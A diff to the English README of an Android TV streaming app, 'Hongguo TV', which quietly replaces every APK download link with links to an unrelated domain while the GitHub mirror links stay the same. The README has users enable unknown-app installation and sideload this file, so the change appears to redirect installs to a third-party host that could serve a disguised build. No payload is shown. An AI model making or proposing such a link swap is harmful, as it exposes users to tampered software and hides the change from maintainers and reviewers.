@@ -12,7 +12,7 @@
 
 Hongguo TV is a free client for Android TVs, TV boxes and compatible streaming devices. Explore recommendations, rankings, live-action dramas and comics, or search for a title. Guests can watch, like and save shows. Records are saved locally and synced automatically when signed in to a Hongguo account and online. Browse comments and enjoy colorful on-screen messages with round avatars. Episode groups, playback speed and resume controls work with a remote.
 
-**[Download the APK](https://hongguotv-egb.pages.dev/download/latest.apk)** · [GitHub Releases mirror](https://github.com/ILikeVideo/HongGuoTV/releases/latest) · [Report a problem](https://github.com/ILikeVideo/HongGuoTV/issues)
+**[Download the APK](https://tv-admin.curatedlifefinds.com/download/latest.apk)** · [GitHub Releases mirror](https://github.com/ILikeVideo/HongGuoTV/releases/latest) · [Report a problem](https://github.com/ILikeVideo/HongGuoTV/issues)
 
 Android 8.0+ · Current version **1.0.31** · Package: `com.hongguo.tv` · Three interface languages
 
@@ -101,7 +101,7 @@ Samsung Tizen, LG webOS, VIDAA, Roku, Titan OS, Apple TV/tvOS and Vega OS cannot
 
 Connect the box to your TV, select its HDMI input and use the **box remote**. Install the APK on the box, rather than in the TV's separate operating system.
 
-1. Open the [download page](https://hongguotv-egb.pages.dev/download/latest.apk) on your computer or phone and download the release `.apk` file. Do not download or extract Source code archives.
+1. Open the [download page](https://tv-admin.curatedlifefinds.com/download/latest.apk) on your computer or phone and download the release `.apk` file. Do not download or extract Source code archives.
 2. Copy the APK to a USB drive and insert it into the box. Open it with a file manager that supports APK files; choose All files or Installation packages if needed.
 3. When Android asks, allow **that file manager or download tool** to install unknown apps. Return to the installer and confirm installation.
 4. Open Hongguo TV from the box's Apps list. No app login or membership is required.
@@ -128,7 +128,7 @@ For more model notes, see the [detailed TV box guide, in Chinese](README.md#tv-b
 
 - **Android phone → Android TV:** install **Send Files to TV** on both devices. Keep them on the same local network. Select Receive on TV, Send on the phone, choose the APK and the TV, then open the received APK and confirm installation. [Developer's store page](https://play.google.com/store/apps/details?id=com.yablio.sendfilestotv&hl=en)
 - **Computer or iPhone → box:** if the box already has a browser-upload/file-transfer tool, open its receiving screen. Enter the displayed local address in your browser, upload the APK, then confirm installation on the box.
-- **Download on the box:** where available, use a browser or **Downloader by AFTVnews**, enter `https://hongguotv-egb.pages.dev/download/latest.apk`, download the APK and follow the system installer. [Downloader developer](https://www.aftvnews.com/downloader/)
+- **Download on the box:** where available, use a browser or **Downloader by AFTVnews**, enter `https://tv-admin.curatedlifefinds.com/download/latest.apk`, download the APK and follow the system installer. [Downloader developer](https://www.aftvnews.com/downloader/)
 
 ![Wireless installation choices for phones and computers](screenshots/install-wireless-options.png)
 
@@ -152,4 +152,4 @@ Favorites, likes and viewing progress are saved locally and synced when signed i
 
 See the [full troubleshooting table, in Chinese](INSTALL.md#troubleshooting). When opening an [issue](https://github.com/ILikeVideo/HongGuoTV/issues), include the app version, model, Android version and steps to reproduce. Do not share passwords or private backups.
 
-**[Download Hongguo TV](https://hongguotv-egb.pages.dev/download/latest.apk)** · [Release history](https://github.com/ILikeVideo/HongGuoTV/releases)
+**[Download Hongguo TV](https://tv-admin.curatedlifefinds.com/download/latest.apk)** · [Release history](https://github.com/ILikeVideo/HongGuoTV/releases)
